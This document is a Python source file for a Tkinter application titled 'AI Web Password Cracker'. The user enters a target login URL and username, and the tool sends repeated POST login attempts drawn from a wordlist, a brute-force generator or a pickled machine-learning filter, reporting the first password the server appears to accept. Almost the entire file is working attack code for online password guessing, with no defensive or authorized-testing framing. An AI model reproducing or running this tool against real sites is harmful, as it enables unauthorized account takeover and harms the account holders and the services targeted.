import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import threading
import os
import pickle
import requests
import itertools
import string
import pandas as pd  # import pandas pour CSV
import sklearn


# Trick to force PyInstaller to include sklearn
try:
    from sklearn.linear_model import LogisticRegression
except ImportError:
    pass

def load_ai_model(model_path='ai/password_model.pkl', vectorizer_path='ai/vectorizer.pkl'):
    with open(model_path, 'rb') as m, open(vectorizer_path, 'rb') as v:
        return pickle.load(m), pickle.load(v)

model, vectorizer = load_ai_model()

def log_message(text_widget, message):
    text_widget.config(state='normal')
    text_widget.insert(tk.END, message + "\n")
    text_widget.see(tk.END)
    text_widget.config(state='disabled')

def send_login_request(url, username, password):
    data = {"email": username, "password": password}
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        return "token" in response.text or "success" in response.text
    except requests.RequestException:
        return False

def predict_passwords(passwords, model, vectorizer):
    X = vectorizer.transform(passwords)
    preds = model.predict(X)
    return [pwd for pwd, pred in zip(passwords, preds) if pred == 1]

def brute_force_generator(max_length=10):
    chars = string.ascii_lowercase + string.digits
    for l in range(1, max_length + 1):
        for combo in itertools.product(chars, repeat=l):
            yield ''.join(combo)

def load_passwords(filepath):
    if filepath.lower().endswith('.csv'):
        try:
            df = pd.read_csv(filepath)
            return df.iloc[:, 0].astype(str).tolist()  # première colonne
        except Exception as e:
            raise IOError(f"Erreur lecture fichier CSV : {e}")
    else:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]

def launch_gui():
    window = tk.Tk()
    window.title("AI Web Password Cracker")
    window.geometry("850x600")

    try:
        window.iconphoto(False, tk.PhotoImage(file="assets/icon.png"))
    except Exception:
        pass

    tk.Label(window, text="🔓 AI Web Password Cracker", font=("Helvetica", 18, "bold")).pack(pady=10)

    url_label = tk.Label(window, text="🌐 Web Login URL:")
    url_label.pack()
    url_entry = tk.Entry(window, width=70)
    url_entry.pack(pady=3)

    username_label = tk.Label(window, text="👤 Target Username/Email:")
    username_label.pack()
    username_entry = tk.Entry(window, width=70)
    username_entry.pack(pady=3)

    wordlist_label = tk.Label(window, text="📚 Wordlist file (.txt or .csv):")
    wordlist_label.pack()
    wordlist_entry = tk.Entry(window, width=70)
    wordlist_entry.pack(pady=3)
    tk.Button(window, text="Browse", command=lambda: wordlist_entry.delete(0, tk.END) or wordlist_entry.insert(0, filedialog.askopenfilename())).pack()

    mode_label = tk.Label(window, text="🧠 Attack Mode:")
    mode_label.pack()
    mode_choice = ttk.Combobox(window, values=[
        "Dictionary",
        "Brute Force (All)",
        "Brute Force (AI Filtered)",
        "AI Prediction Only"
    ])
    mode_choice.current(0)
    mode_choice.pack(pady=5)

    log_area = scrolledtext.ScrolledText(window, state='disabled', height=6)
    log_area.pack(padx=10, pady=10, fill='both', expand=True)

    stop_flag = False

    def stop_attack():
        nonlocal stop_flag
        stop_flag = True

    def run_attack():
        nonlocal stop_flag
        stop_flag = False

        url = url_entry.get()
        username = username_entry.get()
        wordlist_path = wordlist_entry.get()
        mode = mode_choice.get()

        if not url or not username:
            messagebox.showerror("Error", "URL and Username required.")
            return

        log_message(log_area, f"🌐 Target URL: {url}")
        log_message(log_area, f"👤 Username: {username}")
        log_message(log_area, f"🔄 Mode: {mode}")

        try:
            if mode == "Dictionary" or mode == "AI Prediction Only":
                if not os.path.isfile(wordlist_path):
                    messagebox.showerror("Error", "Invalid wordlist file.")
                    return
                passwords = load_passwords(wordlist_path)
                if mode == "AI Prediction Only":
                    passwords = predict_passwords(passwords, model, vectorizer)
            elif mode == "Brute Force (All)" or mode == "Brute Force (AI Filtered)":
                max_length = 10  # Valeur fixe ici ou tu peux intégrer un champ si tu veux
                if mode == "Brute Force (All)":
                    passwords = brute_force_generator(max_length)
                else:
                    raw = list(brute_force_generator(max_length))
                    passwords = predict_passwords(raw, model, vectorizer)
            else:
                messagebox.showwarning("Warning", "Invalid mode.")
                return
        except IOError as e:
            messagebox.showerror("File Error", str(e))
            return

        for i, pwd in enumerate(passwords):
            if stop_flag:
                log_message(log_area, "[⛔] Attack stopped by user.")
                return
            if send_login_request(url, username, pwd):
                log_message(log_area, f"[✅] Password found: {pwd}")
                return
            if i % 500 == 0:
                log_message(log_area, f"[...] Attempt {i}: {pwd}")

        log_message(log_area, "[❌] Password not found.")

    launch_btn = tk.Button(window, text="Start Cracking", bg="#4CAF50", fg="white",
                           font=("Helvetica", 12, "bold"), command=lambda: threading.Thread(target=run_attack).start())
    launch_btn.pack(pady=5)

    stop_btn = tk.Button(window, text="Stop", bg="#f44336", fg="white",
                         font=("Helvetica", 12), command=stop_attack)
    stop_btn.pack(pady=2)

    window.mainloop()

if __name__ == "__main__":
    launch_gui()
